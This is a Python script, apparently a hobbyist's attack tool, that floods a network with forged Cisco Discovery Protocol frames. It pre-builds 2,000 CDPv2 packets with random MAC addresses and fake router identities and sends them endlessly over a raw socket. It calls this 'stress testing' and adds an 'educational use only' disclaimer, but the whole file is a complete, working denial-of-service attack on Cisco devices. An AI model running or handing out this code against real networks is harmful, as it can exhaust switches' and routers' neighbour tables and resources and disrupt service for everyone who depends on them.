#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Tool: D31B1 CDP Flood (Raw Socket Edition)
Author: Junior (Deivi) - D31B1
Description: High-speed CDP Flooding tool for stress testing Cisco devices.
             Uses Raw Sockets to bypass standard network stack processing.
Disclaimer: EDUCATIONAL USE ONLY. Do not use on unauthorized networks.
"""

import socket
import sys
import time
from scapy.all import *

# Load CDP contribution from Scapy
load_contrib("cdp")
from scapy.contrib.cdp import *

# --- CONFIGURATION ---
TOOL_NAME = "D31B1 CDP FLOOD"
VERSION = "1.0.0 (Stable)"
PAYLOAD_ID = "D31B1_Ghost"  # Prefix for the fake device names

def banner():
    print("\n" + "="*65)
    print(f" 💀  {TOOL_NAME} - {VERSION}  💀")
    print(f"     >> Created by: Junior (D31B1)")
    print(f"     >> Mode: RAW SOCKETS (Extreme Speed)")
    print("="*65)

def main():
    banner()

    # 1. Interface Selection
    interfaz = input("\n[?] Network Interface (Press Enter for 'eth0'): ").strip() or "eth0"
    
    try:
        # Open Raw Socket (AF_PACKET) for maximum injection speed
        # This bypasses Scapy's send() overhead
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
        s.bind((interfaz, 0))
    except PermissionError:
        print(f"\n[!] ERROR: Permission Denied. You must run this tool as root (sudo).")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] ERROR: Could not bind to interface '{interfaz}'. Details: {e}")
        sys.exit(1)

    print(f"\n[*] Generating high-speed payload in RAM...")
    
    # 2. Pre-Calculate Packets (The "Ammo")
    # We generate 2000 unique packets and store them as raw bytes
    municion = []
    amount = 2000
    
    for i in range(amount):
        mac_src = RandMAC()
        device_id = f"{PAYLOAD_ID}_{i:04d}" # e.g., D31B1_Ghost_0001
        
        # Build CDPv2 Packet
        pkt = Ether(src=mac_src, dst="01:00:0c:cc:cc:cc") / \
              LLC(dsap=0xaa, ssap=0xaa, ctrl=3) / \
              SNAP(OUI=0x00000c, code=0x2000) / \
              CDPv2_HDR(vers=2, ttl=180) / \
              CDPMsgDeviceID(val=device_id) / \
              CDPMsgPortID(iface="GigabitEthernet0/0") / \
              CDPMsgCapabilities(cap=0x10) # 0x10 = Router
        
        municion.append(bytes(pkt))

    print(f"[*] Payload loaded: {len(municion)} unique packets ready.")
    input(f"[PRESS ENTER] To launch stress test on {interfaz}...")
    
    print("\nwd[+] 🚀 FLOODING STARTED! (Press CTRL+C to stop)")
    
    counter = 0
    try:
        while True:
            # 3. Injection Loop
            for pkt_bytes in municion:
                s.send(pkt_bytes)
                counter += 1
                
            # Optimized feedback (only updates every 20k packets to save CPU)
            if counter % 20000 == 0:
                sys.stdout.write(f"\r[☠️] Packets Injected: {counter} | Status: Flooding...")
                sys.stdout.flush()

    except KeyboardInterrupt:
        print("\n\n[!] Attack stopped by user.")
        s.close()
        sys.exit(0)

if __name__ == "__main__":
    main()